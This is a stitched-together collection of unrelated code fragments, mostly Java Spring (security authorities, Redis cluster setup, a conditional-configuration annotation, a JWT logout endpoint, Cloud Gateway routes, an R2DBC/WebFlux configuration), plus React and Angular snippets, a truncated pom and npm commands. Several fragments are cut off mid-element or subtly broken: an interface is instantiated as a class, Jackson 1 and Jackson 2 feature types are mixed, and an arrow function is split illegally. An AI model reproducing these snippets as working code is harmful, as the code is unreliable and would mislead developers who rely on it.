		public Collection<? extends GrantedAuthority> getAuthorities() {
			if(user.isAdmin()) {
				return user.isClaAuthor() ? CLA_AUTHOR_ROLES : ADMIN_ROLES;
			}
			return USER_ROLES;
		}

		@Override
		public Object getCredentials() {
			return null;
		}

		@Override
		public Object getDetails() {
			return null;
		}

		@Override
		public Object getPrincipal() {
			return user;
		}

		@Override
		public boolean isAuthenticated() {
			return true;
		}

		@Override
		public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException {
			throw new UnsupportedOperationException();
		}
	}
}
--------------------------------------------------------------------------------------------------------
import com.maxplus1.demo.utils.Serializer;
import org.springframework.boot.autoconfigure.data.redis.RedisProperties;
import org.springframework.data.redis.connection.RedisClusterConfiguration;
import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.StringRedisSerializer;

/**
 * Created by xiaolong.qiu on 2017/4/6.
 */
public class RedisConfUtils {

    /**
     * {@link org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration#getClusterConfiguration}
     * @param redisProperties
     * @return
     */
    public static RedisClusterConfiguration  getClusterConfiguration(RedisProperties redisProperties) {
        if (redisProperties.getCluster() == null) {
            return null;
        }
        RedisProperties.Cluster clusterProperties = redisProperties.getCluster();
        RedisClusterConfiguration config = new RedisClusterConfiguration(
                clusterProperties.getNodes());

        if (clusterProperties.getMaxRedirects() != null) {
            config.setMaxRedirects(clusterProperties.getMaxRedirects());
        }
        return config;
    }

    public static RedisTemplate buildRedisTemplate(byte[] redisProperties){
        JedisConnectionFactory jedisConnectionFactory = new JedisConnectionFactory(
                RedisConfUtils.getClusterConfiguration(
                        (RedisProperties) Serializer.INSTANCE.deserialize(redisProperties)));
        RedisTemplate<String, Long> redisTemplate = new RedisTemplate<>();
        redisTemplate.setConnectionFactory(jedisConnectionFactory);
        jedisConnectionFactory.afterPropertiesSet();

        GenericJackson2JsonRedisSerializer genericJackson2JsonRedisSerializer = new GenericJackson2JsonRedisSerializer();
        StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();
        redisTemplate.setKeySerializer(stringRedisSerializer);
        redisTemplate.setValueSerializer(genericJackson2JsonRedisSerializer);
        redisTemplate.setHashKeySerializer(stringRedisSerializer);
        redisTemplate.setHashValueSerializer(genericJackson2JsonRedisSerializer);
        redisTemplate.afterPropertiesSet();
        return redisTemplate;
    }
}
--------------------------------------------------------------------------------------------------------
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency> <!-- 引入log4j2依赖 -->
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-log4j2</artifactId>
        </dependency>
        <dependency>  <!-- 加上这个才能辨认到log4j2.yml文件 -->
            <groupId>com.fasterxml.jackson.dataformat</groupId>
            <artifactId>jackson-dataformat-yaml</artifactId>
        </dependency>
        <!-- 引入jackson依赖 -->
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>
<!--<scope.type>compile</scope.type>-->
--------------------------------------------------------------------------------------------------------
@ToString(doNotUseGetters = true)
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Conditional;

import java.lang.annotation.*;

/**
 * Conditional annotation for disable a detector.<br>
 * <p>
 * application.properties:<br>
 *
 * <code>
 * redis.enabled = false # Disable the redis configuration
 * </code>
 */
@Documented
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)
@Conditional(OnEnabledDetectorCondition.class)
public @interface ConditionalOnEnabledConfiguration {

    String value();

    String prefix() default "";
}

package com.paragon.mailingcontour.commons.annotation;

import lombok.RequiredArgsConstructor;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.condition.ConditionMessage;
import org.springframework.boot.autoconfigure.condition.ConditionOutcome;
import org.springframework.boot.autoconfigure.condition.SpringBootCondition;
import org.springframework.boot.bind.RelaxedPropertyResolver;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.core.annotation.AnnotationAttributes;
import org.springframework.core.env.Environment;
import org.springframework.core.env.PropertyResolver;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.stereotype.Component;

/**
 * Matches when a relationship detector has its {@literal enabled} property set
 * to {@code true} (matches by default).
 *
 * @author lucwarrot
 * @author michaeltecourt
 */
@Component
@RequiredArgsConstructor
public class OnEnabledDetectorCondition extends SpringBootCondition {
    private final Environment environment;

    @Override
    public ConditionOutcome getMatchOutcome(final ConditionContext context, final AnnotatedTypeMetadata metadata) {
        AnnotationAttributes attributes = AnnotationAttributes.fromMap(metadata.getAnnotationAttributes(ConditionalOnEnabledConfiguration.class.getName()));
        final String name = attributes.getString("value");
        final String prefix = attributes.getString("prefix");
        final RelaxedPropertyResolver resolver = new PropertyResolver(context.getEnvironment(), prefix + "." + name + ".");
        final boolean enabled = resolver.getProperty("enabled", Boolean.class, true);
        return new ConditionOutcome(enabled, ConditionMessage.forCondition(ConditionalOnEnabledConfiguration.class, name).because(enabled ? "enabled" : "disabled"));
    }

    protected boolean isConditionSatisfied(String configPropertyName, String configPropertyValue,
                                           String configPropertyDefaultValue) {
        String propertyValue = this.environment.getProperty(configPropertyName);
        if (propertyValue == null && StringUtils.isNotEmpty(configPropertyDefaultValue)) {
            propertyValue = configPropertyDefaultValue;
        }

        return configPropertyValue.equals(propertyValue);
    }
}
--------------------------------------------------------------------------------------------------------
   /**
     * Filter snitch duplicates based on the Snitch URI.
     * 
     * @param snitches
     *            Snitch instances to be filtered.
     * @return a List of Snitch objects without any duplicate URI.
     */
    public static List<Snitch> filterDuplicateLocations(Collection<Snitch> snitches) {
        // @formatter:off
        return snitches.stream()
            .collect(Collectors.groupingBy(Snitch::getUri))
            .values()
            .stream()
            .flatMap(list -> Stream.of(list.get(0)))
            .collect(Collectors.toList());
        // @formatter:on
    }
--------------------------------------------------------------------------------------------------------
import React, { useState, useEffect }
from "react";

const HelloWorld = ()
=> {
  const [message] = useState("Hello World!");

  useEffect(() => {
    console.log("Component has mounted!");
  }, []);

  return <h2>{message}</h2>;
}

import React, { Component } from "react";

class HelloWorld extends Component {
  constructor(props) {
    super(props);
    this.state = {
      message: "Hello World!"
    };
  }
  componentDidMount() {
    console.log("Component has mounted!");
  }
  render() {
    return <h2>{this.state.message}</h2>;
  }
}
--------------------------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.constraint.validator;

import com.google.common.base.Objects;
import com.paragon.mailingcontour.commons.constraint.annotation.Conditional;
import com.paragon.mailingcontour.commons.utils.ValidationUtils;
import org.apache.commons.lang3.BooleanUtils;
import org.apache.commons.lang3.ObjectUtils;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.BeanWrapperImpl;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;
import java.util.Optional;
import java.util.function.Predicate;

import static com.paragon.mailingcontour.commons.constraint.utils.ConstraintUtils.validate;
import static com.paragon.mailingcontour.commons.utils.ServiceUtils.streamOf;

/**
 * {@link Conditional} {@link ConstraintValidator} implementation
 */
public class ConditionalConstraintValidator implements ConstraintValidator<Conditional, Object> {

    /**
     * Default {@link String} message
     */
    private String message;
    /**
     * Default selected {@link String} property
     */
    private String selected;
    /**
     * Default array of required {@link String} values
     */
    private String[] required;
    /**
     * Default array of supported {@link String} values
     */
    private String[] values;

    /**
     * Default {@link Conditional} {@link Predicate}
     */
    private final Predicate<String> conditionalPredicate = value -> {
        return Optional.of(value)
                .map(BeanWrapperImpl::new)
                .map(v -> v.getValue(value))
                .map(ObjectUtils::isNotEmpty)
                .orElse(false);
    };

    /**
     * Initializes validator by input {@link Conditional} annotation parameters
     *
     * @param constraintAnnotation - initial input {@link Conditional} annotation
     */
    @Override
    public void initialize(final Conditional constraintAnnotation) {
        ValidationUtils.checkNotNull(constraintAnnotation, "Constraint annotation should not be null");
        ValidationUtils.checkNotNull(constraintAnnotation.required(), "Required values should not be null");
        ValidationUtils.checkNotNull(constraintAnnotation.values(), "Values should not be null");

        this.selected = constraintAnnotation.selected();
        this.required = constraintAnnotation.required();
        this.values = constraintAnnotation.values();
        this.message = constraintAnnotation.message();
    }

    /**
     * Validates input {@link Conditional} value by {@link ConstraintValidatorContext}
     *
     * @param value   - initial input {@link Conditional} to validate
     * @param context - initial input {@link ConstraintValidatorContext}
     * @return true - if input {@link Conditional} is valid, false - otherwise
     */
    @Override
    public boolean isValid(final Object value, final ConstraintValidatorContext context) {
        final Object actualValue = Optional.of(value)
                .map(BeanWrapperImpl::new)
                .map(v -> v.getPropertyValue(this.selected))
                .orElse(null);
        return streamOf(this.values)
                .filter(v -> Objects.equal(v, actualValue))
                .flatMap(current -> streamOf(this.required)
                        .map(v -> validate(this.conditionalPredicate, current, this.message, context)))
                .filter(BooleanUtils::isTrue)
                .findFirst()
                .orElse(true);
    }
}
--------------------------------------------------------------------------------------------------------
public static Map<String, Object> beanProperties(Object bean) {
    try {
        Map<String, Object> map = new HashMap<>();
        Arrays.asList(Introspector.getBeanInfo(bean.getClass(), Object.class)
                                  .getPropertyDescriptors())
              .stream()
              // filter out properties with setters only
              .filter(pd -> Objects.nonNull(pd.getReadMethod()))
              .forEach(pd -> { // invoke method to get value
                  try {
                      Object value = pd.getReadMethod().invoke(bean);
                      if (value != null) {
                          map.put(pd.getName(), value);
                      }
                  } catch (Exception e) {
                      // add proper error handling here
                  }
              });
        return map;
    } catch (IntrospectionException e) {
        // and here, too
        return Collections.emptyMap();
    }
}
--------------------------------------------------------------------------------------------------------
npm install --save-dev @testing-library/angular
--------------------------------------------------------------------------------------------------------
export class FeedbackComponent
{
  @Input() shirtSizes: string[] = [];
  @Output() submitForm = new EventEmitter<Feedback>();

  form = this.formBuilder.group({
    name: ["", [Validators.required]],
    rating: [
      "",
      [
        Validators.required,
        Validators.min(0),
        Validators.max(10)
      ]
    ],
    description: [""],
    shirtSize: ["", [Validators.required]]
  });

  nameControl = this.form.get("name");
  ratingControl = this.form.get("rating");
  shirtSizeControl = this.form.get("shirtSize");

  constructor(private formBuilder:
FormBuilder) {}

  submit() {
    if (this.form.valid)
{
      this.submitForm.emit(this.form.value);
    }
  }
}
--------------------------------------------------------------------------------------------------------
/**
 * Delete authentication token map.
 *
 * @param version the version
 * @param request the request
 * @return the map
 */
@DeleteMapping(value = "/token", produces = "application/json; charset=UTF-8")
@ApiOperation(value = "清空token")
@ApiImplicitParams(
  {
    @ApiImplicitParam(name = "Authorization", required = true, paramType = "header",
      dataType = "string", value = "authorization header", defaultValue = "Bearer ")
  }
)
public Map<String, Object> deleteAuthenticationToken(
  @ApiParam(required = true, value = "版本", defaultValue = "v1") @PathVariable("version") String version,
  HttpServletRequest request) {
  String tokenHeader = request.getHeader(AuthenticationTokenFilter.TOKEN_HEADER);
  String token = tokenHeader.split(" ")[1];
  //移除token
  jwtTokenUtil.removeToken(token);
  Map<String, Object> message = new HashMap<>();
  message.put(Message.RETURN_FIELD_CODE, ReturnCode.SUCCESS);
  return message;
}

--------------------------------------------------------------------------------------------------------
<configuration>
    <appender name="stdout" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%-5level %d{yyyy-MM-dd HH:mm:ss.SSS} [%logger{0}] {%thread}: %msg%n</pattern>
        </encoder>
    </appender>

    <root level="info">
        <appender-ref ref="stdout"/>
    </root>

    <logger name="io.hekate" level="warn"/>
</configuration>
--------------------------------------------------------------------------------------------------------
npm install node-mock-server --save-dev
node node_modules/node-mock-server/init

$ npm install -g mockserver
$ mockserver -p 8080 -m test/mocks
$ mockserver -p 8080 -m './mocks'
https://redis.io/topics/rediscli
GET.mock


    for "string": get <key>
    for "hash": hgetall <key>
    for "list": lrange <key> 0 -1
    for "set": smembers <key>
    for "zset": zrange <key> 0 -1 withscores
--------------------------------------------------------------------------------------------------------
public void sessionDestroyed(HttpSessionEvent se) {
    ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(se.getSession().getServletContext());
    if (ctx == null) {
        logger.warn("cannot find applicationContext");
        return;
    }
    HttpSession session = se.getSession();
    UserAuthDTO userAuthDto = this.internalUserAuthConnector.findFromSession(session);
    String tenantId = null;
    if (userAuthDto != null) {
        tenantId = userAuthDto.getTenantId();
    }
    LogoutEvent logoutEvent = new LogoutEvent(session, null, session.getId(), tenantId);
    ctx.publishEvent(logoutEvent);
}
--------------------------------------------------------------------------------------------------------

import org.springframework.beans.BeansException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;

public class ApplicationContextUtils implements ApplicationContextAware {

	private static ApplicationContext ctx;

	@Override
	public void setApplicationContext(ApplicationContext appContext)
			throws BeansException {
		ctx = appContext;

	}

	public static ApplicationContext getApplicationContext() {
		return ctx;
	}
}
--------------------------------------------------------------------------------------------------------
import javax.annotation.Resource;
 
import javax.servlet.http.HttpSession;
import javax.servlet.http.HttpSessionEvent;
import javax.servlet.http.HttpSessionListener;
 
import com.mossle.api.userauth.UserAuthDTO;
 
import com.mossle.core.auth.LogoutEvent;
 
import com.mossle.spi.userauth.InternalUserAuthConnector;
 
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
 
import org.springframework.context.ApplicationContext;
 
import org.springframework.web.context.support.WebApplicationContextUtils;
 
public class LogoutHttpSessionListener implements HttpSessionListener {
    private static Logger logger = LoggerFactory
            .getLogger(LogoutHttpSessionListener.class);
    private InternalUserAuthConnector internalUserAuthConnector;
 
    public void sessionCreated(HttpSessionEvent se) {
    }
 
    public void sessionDestroyed(HttpSessionEvent se) {
        ApplicationContext ctx = WebApplicationContextUtils
                .getWebApplicationContext(se.getSession().getServletContext());
 
        if (ctx == null) {
            logger.warn("cannot find applicationContext");
 
            return;
        }
 
        HttpSession session = se.getSession();
        UserAuthDTO userAuthDto = this.internalUserAuthConnector
                .findFromSession(session);
 
        String tenantId = null;
 
        if (userAuthDto != null) {
            tenantId = userAuthDto.getTenantId();
        }
 
        LogoutEvent logoutEvent = new LogoutEvent(session, null,
                session.getId(), tenantId);
        ctx.publishEvent(logoutEvent);
    }
 
    @Resource
    public void setInternalUserAuthConnector(
            InternalUserAuthConnector internalUserAuthConnector) {
        this.internalUserAuthConnector = internalUserAuthConnector;
    }
}
--------------------------------------------------------------------------------------------------------
import com.hellokoding.auth.model.Role;
import com.hellokoding.auth.model.User;
import com.hellokoding.auth.repository.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.HashSet;
import java.util.Set;

@Service
public class UserDetailsServiceImpl implements UserDetailsService{
    @Autowired
    private UserRepository userRepository;

    @Override
    @Transactional(readOnly = true)
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username);

        Set<GrantedAuthority> grantedAuthorities = new HashSet<>();
        for (Role role : user.getRoles()){
            grantedAuthorities.add(new SimpleGrantedAuthority(role.getName()));
        }

        return new org.springframework.security.core.userdetails.User(user.getUsername(), user.getPassword(), grantedAuthorities);
    }
}
--------------------------------------------------------------------------------------------------------
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.reactive.server.WebTestClient;

import static org.springframework.boot.test.context.SpringBootTest.WebEnvironment.RANDOM_PORT;

/**
 * @author Spencer Gibb
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = GatewaySampleApplication.class, webEnvironment = RANDOM_PORT)
public class GatewaySampleApplicationTests {

	@LocalServerPort
	protected int port = 0;

	protected WebTestClient webClient;
	protected String baseUri;

	@Before
	public void setup() {
		baseUri = "http://localhost:" + port;
		this.webClient = WebTestClient.bindToServer().baseUrl(baseUri).build();
	}

	@Test
	public void contextLoads() {
		webClient.get()
				.uri("/get")
				.exchange()
				.expectStatus().isOk();
	}

	@Test
	public void complexPredicate() {
		webClient.get()
				.uri("/image/png")
				.header("Host", "www.abc.org")
				.exchange()
				.expectHeader().valueEquals("X-TestHeader", "foobar")
				.expectStatus().isOk();

	}
}
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.TimeUnit;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.SpringBootConfiguration;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.cloud.gateway.route.RouteLocator;
import org.springframework.cloud.gateway.route.builder.RouteLocatorBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Import;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.RequestPredicates;
import org.springframework.web.reactive.function.server.RouterFunction;
import org.springframework.web.reactive.function.server.RouterFunctions;
import org.springframework.web.reactive.function.server.ServerResponse;

/**
 * @author Spencer Gibb
 */
@SpringBootConfiguration
@EnableAutoConfiguration
@Import(AdditionalRoutes.class)
public class GatewaySampleApplication {

	@Bean
	public RouteLocator customRouteLocator(RouteLocatorBuilder builder, ThrottleGatewayFilterFactory throttle) {
		//@formatter:off
		return builder.routes()
				.route(r -> r.host("**.abc.org").and().path("/image/png")
						.addResponseHeader("X-TestHeader", "foobar")
						.uri("http://httpbin.org:80")
				)
				.route(r -> r.path("/image/webp")
					.addResponseHeader("X-AnotherHeader", "baz")
					.uri("http://httpbin.org:80")
				)
				.route(r -> r.order(-1)
					.host("**.throttle.org").and().path("/get")
					.filter(throttle.apply(1,
							1,
							10,
							TimeUnit.SECONDS))
					.uri("http://httpbin.org:80")
				)
				.build();
		////@formatter:on
	}

	@Bean
	public ThrottleGatewayFilterFactory throttleWebFilterFactory() {
		return new ThrottleGatewayFilterFactory();
	}

	@Bean
	public RouterFunction<ServerResponse> testFunRouterFunction() {
		RouterFunction<ServerResponse> route = RouterFunctions.route(
				RequestPredicates.path("/testfun"),
				request -> ServerResponse.ok().body(BodyInserters.fromObject("hello")));
		return route;
	}

	public static void main(String[] args) {
		SpringApplication.run(GatewaySampleApplication.class, args);
	}
}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateSerializer;
import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateTimeSerializer;
import com.siemens.microservices.sonarine.sensors.converter.CoordinatesToGeolocationConverter;
import com.siemens.microservices.sonarine.sensors.converter.MetricsToRecordConverter;
import com.siemens.microservices.sonarine.sensors.converter.SensorDataRequestToSensorConverter;
import com.siemens.microservices.sonarine.sensors.converter.SensorDataRequestToSensorRecordConverter;
import com.siemens.microservices.sonarine.sensors.repository.SensorMetricsRepository;
import com.siemens.microservices.sonarine.sensors.repository.SensorRepository;
import com.siemens.microservices.sonarine.sensors.system.properties.DatabaseProperties;
import com.siemens.microservices.sonarine.sensors.validation.impl.*;
import io.r2dbc.postgresql.PostgresqlConnectionConfiguration;
import io.r2dbc.postgresql.PostgresqlConnectionFactory;
import io.r2dbc.spi.ConnectionFactory;
import org.codehaus.jackson.map.DeserializationConfig;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.autoconfigure.jackson.Jackson2ObjectMapperBuilderCustomizer;
import org.springframework.context.MessageSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.core.LocalVariableTableParameterNameDiscoverer;
import org.springframework.core.io.ClassPathResource;
import org.springframework.data.r2dbc.dialect.Database;
import org.springframework.data.r2dbc.function.DatabaseClient;
import org.springframework.data.r2dbc.function.DefaultReactiveDataAccessStrategy;
import org.springframework.data.r2dbc.function.ReactiveDataAccessStrategy;
import org.springframework.data.r2dbc.repository.support.R2dbcRepositoryFactory;
import org.springframework.data.r2dbc.support.SqlStateR2dbcExceptionTranslator;
import org.springframework.data.relational.core.mapping.RelationalMappingContext;
import org.springframework.format.FormatterRegistry;
import org.springframework.format.datetime.standard.DateTimeFormatterRegistrar;
import org.springframework.http.codec.ServerCodecConfigurer;
import org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;
import org.springframework.validation.beanvalidation.MethodValidationPostProcessor;
import org.springframework.web.reactive.config.EnableWebFlux;
import org.springframework.web.reactive.config.WebFluxConfigurer;
import org.springframework.web.servlet.LocaleResolver;
import org.springframework.web.servlet.i18n.LocaleChangeInterceptor;
import org.springframework.web.servlet.i18n.SessionLocaleResolver;
import reactor.core.scheduler.Scheduler;
import reactor.core.scheduler.Schedulers;

import javax.validation.ValidatorFactory;
import java.nio.charset.StandardCharsets;
import java.time.format.DateTimeFormatter;
import java.util.Locale;
import java.util.concurrent.Executor;

import static com.siemens.microservices.sonarine.sensors.utility.DateUtils.DEFAULT_DATETIME_FORMAT;
import static com.siemens.microservices.sonarine.sensors.utility.DateUtils.DEFAULT_DATE_FORMAT;

/**
 * Application configuration
 */
@Configuration
@EnableWebFlux
public class AppConfiguration implements WebFluxConfigurer {

    @Override
    public void configureHttpMessageCodecs(final ServerCodecConfigurer configurer) {
        configurer.defaultCodecs().enableLoggingRequestDetails(true);
    }

    @Override
    public void addFormatters(final FormatterRegistry registry) {
        final DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();
        registrar.setUseIsoFormat(true);
        registrar.registerFormatters(registry);

        registry.addConverter(new CoordinatesToGeolocationConverter());
        registry.addConverter(new MetricsToRecordConverter());
        registry.addConverter(new SensorDataRequestToSensorConverter());
        registry.addConverter(new SensorDataRequestToSensorRecordConverter());
        WebFluxConfigurer.super.addFormatters(registry);
    }

//    @Bean
//    @Validated
//    @ConfigurationProperties(prefix = "spring.datasource", ignoreInvalidFields = true)
//    public DataSourceProperties dataSourceProperties() {
//        return new DataSourceProperties();
//    }

    @Bean
    public Scheduler jdbcScheduler(final Executor asyncTaskExecutor) {
        return Schedulers.fromExecutor(asyncTaskExecutor);
    }

    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        final PropertySourcesPlaceholderConfigurer properties = new PropertySourcesPlaceholderConfigurer();
        properties.setLocation(new ClassPathResource("application.yml"));
        properties.setIgnoreResourceNotFound(false);
        return properties;
    }

    @Bean(name = "messageSource")
    public ReloadableResourceBundleMessageSource localizationMessageSource(@Value("${sonarine.i18n.location:'/i18n'}") final String sourceLocation,
                                                                           @Value("${sonarine.i18n.timeout:3600}") final Integer cacheTimeout) {
        return this.loadMessageSource(sourceLocation, cacheTimeout);
    }

    @Bean(name = "validationSource")
    public ReloadableResourceBundleMessageSource validationMessageSource(@Value("${sonarine.validation.location:'/validation'}") final String sourceLocation,
                                                                         @Value("${sonarine.validation.timeout:3600}") final Integer cacheTimeout) {
        return this.loadMessageSource(sourceLocation, cacheTimeout);
    }

    @Bean
    public DefaultValidatorRegistry validatorRegistry() {
        final DefaultValidatorRegistry registry = new DefaultValidatorRegistry();
        registry.addValidator(new TemperatureValidator());
        registry.addValidator(new CoordinatesValidator());
        registry.addValidator(new GeneralRequestValidator());
        registry.addValidator(new GeneralParamRequestValidator());
        return registry;
    }

    @Bean
    @ConditionalOnProperty(value = "spring.jackson.date-format", matchIfMissing = true, havingValue = "none")
    public Jackson2ObjectMapperBuilderCustomizer jsonCustomizer() {
        return builder -> {
            builder.simpleDateFormat(DEFAULT_DATETIME_FORMAT);
            builder.serializers(new LocalDateSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT)));
            builder.serializers(new LocalDateTimeSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATETIME_FORMAT)));
            builder.featuresToEnable(
                JsonParser.Feature.ALLOW_SINGLE_QUOTES,
                JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES,
                JsonGenerator.Feature.WRITE_NUMBERS_AS_STRINGS,
                JsonGenerator.Feature.QUOTE_NON_NUMERIC_NUMBERS
            );
            builder.featuresToDisable(
                DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES,
                DeserializationConfig.Feature.FAIL_ON_NUMBERS_FOR_ENUMS
            );
            builder.indentOutput(true);
            builder.autoDetectFields(true);
            builder.createXmlMapper(false);
        };
    }

    @Bean
    public ValidatorFactory validator(final MessageSource validationSource) {
        final LocalValidatorFactoryBean factoryBean = new LocalValidatorFactoryBean();
        factoryBean.setValidationMessageSource(validationSource);
        factoryBean.setParameterNameDiscoverer(new LocalVariableTableParameterNameDiscoverer());
        return factoryBean;
    }

    @Bean
    public MethodValidationPostProcessor methodValidationPostProcessor(final ValidatorFactory validator) {
        final MethodValidationPostProcessor processor = new MethodValidationPostProcessor();
        processor.setValidatorFactory(validator);
        return processor;
    }

    @Bean
    public LocaleResolver localeResolver() {
        final SessionLocaleResolver localeResolver = new SessionLocaleResolver();
        localeResolver.setDefaultLocale(Locale.getDefault());
        return localeResolver;
    }

    @Bean
    public LocaleChangeInterceptor localeChangeInterceptor() {
        final LocaleChangeInterceptor interceptor = new LocaleChangeInterceptor();
        interceptor.setParamName("lang");
        return interceptor;
    }

    private ReloadableResourceBundleMessageSource loadMessageSource(final String location, final int timeout) {
        final ReloadableResourceBundleMessageSource resourceBundleMessageSource = new ReloadableResourceBundleMessageSource();
        resourceBundleMessageSource.setBasename(location);
        resourceBundleMessageSource.setDefaultEncoding(StandardCharsets.UTF_8.name());
        resourceBundleMessageSource.setCacheSeconds(timeout);
        resourceBundleMessageSource.setUseCodeAsDefaultMessage(true);
        resourceBundleMessageSource.setFallbackToSystemLocale(true);
        return resourceBundleMessageSource;
    }

//    @Override
//    public void addResourceHandlers(final ResourceHandlerRegistry registry) {
//        registry.addResourceHandler("/swagger-ui.html**").addResourceLocations("classpath:/META-INF/resources/");
//        registry.addResourceHandler("/webjars/**").addResourceLocations("classpath:/META-INF/resources/webjars/");
//        registry.addResourceHandler("/resources/**").addResourceLocations("/resources/").setCachePeriod(3600).resourceChain(true).addResolver(new PathResourceResolver());
//        registry.addResourceHandler("/resources/**").addResourceLocations("/resources/").setCacheControl(CacheControl.maxAge(3600, TimeUnit.MILLISECONDS)).resourceChain(true).addResolver(new PathResourceResolver());
//        WebFluxConfigurer.super.addResourceHandlers(registry);
//    }

//    @Override
//    public void addCorsMappings(final CorsRegistry corsRegistry) {
//        corsRegistry.addMapping("/**")
//            .allowedOrigins("localhost")
//            .allowedMethods("PUT", "GET", "DELETE", "POST")
//            .allowedHeaders("PEM", "PEM-Exposed")
//            .maxAge(3600);
//    }

    @Bean
    public SensorRepository sensorRepository(final R2dbcRepositoryFactory factory) {
        return factory.getRepository(SensorRepository.class);
    }

    @Bean
    public SensorMetricsRepository sensorMetricsRepository(final R2dbcRepositoryFactory factory) {
        return factory.getRepository(SensorMetricsRepository.class);
    }

    @Bean
    public R2dbcRepositoryFactory factory(final DatabaseClient client) {
        final RelationalMappingContext context = new RelationalMappingContext();
        final ReactiveDataAccessStrategy strategy = new DefaultReactiveDataAccessStrategy(Database.POSTGRES.defaultDialect());
        context.afterPropertiesSet();
        return new R2dbcRepositoryFactory(client, context, strategy);
    }

    @Bean
    public DatabaseClient databaseClient(final ConnectionFactory connectionFactory) {
        return DatabaseClient.builder()
            .exceptionTranslator(new SqlStateR2dbcExceptionTranslator())
            .connectionFactory(connectionFactory)
            .build();
    }

    @Bean
    public PostgresqlConnectionFactory connectionFactory(final DatabaseProperties properties) {
        final PostgresqlConnectionConfiguration config = PostgresqlConnectionConfiguration.builder()
            .host(properties.getHost())
            .port(properties.getPort())
            .database(properties.getDatabase())
            .username(properties.getUsername())
            .password(properties.getPassword())
            .build();
        return new PostgresqlConnectionFactory(config);
    }
}

--------------------------------------------------------------------------------------------------------
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import org.springframework.context.event.EventListener;
import reactor.core.publisher.Flux;

/**
 * @author Spencer Gibb
 */
public class CachingRouteDefinitionLocator implements RouteDefinitionLocator {

	private final RouteDefinitionLocator delegate;
	private final AtomicReference<List<RouteDefinition>> cachedRoutes = new AtomicReference<>();

	public CachingRouteDefinitionLocator(RouteDefinitionLocator delegate) {
		this.delegate = delegate;
		this.cachedRoutes.compareAndSet(null, collectRoutes());
	}

	@Override
	public Flux<RouteDefinition> getRouteDefinitions() {
		return Flux.fromIterable(this.cachedRoutes.get());
	}

	/**
	 * Sets the new routes
	 * @return old routes
	 */
	public Flux<RouteDefinition> refresh() {
		return Flux.fromIterable(this.cachedRoutes.getAndUpdate(
				routes -> CachingRouteDefinitionLocator.this.collectRoutes()));
	}

	private List<RouteDefinition> collectRoutes() {
		return this.delegate.getRouteDefinitions().collectList().block();
	}

	@EventListener(RefreshRoutesEvent.class)
    /* for testing */ void handleRefresh() {
        refresh();
    }
}
--------------------------------------------------------------------------------------------------------
package org.springframework.cloud.gateway.route.builder;

import org.springframework.cloud.gateway.route.Route;
import org.springframework.util.Assert;
import org.springframework.web.server.ServerWebExchange;

import java.util.function.Predicate;

import static org.springframework.cloud.gateway.route.builder.BooleanSpec.Operator.*;

public class BooleanSpec extends GatewayFilterSpec {

	enum Operator { AND, OR, NEGATE }

	final Predicate<ServerWebExchange> predicate;

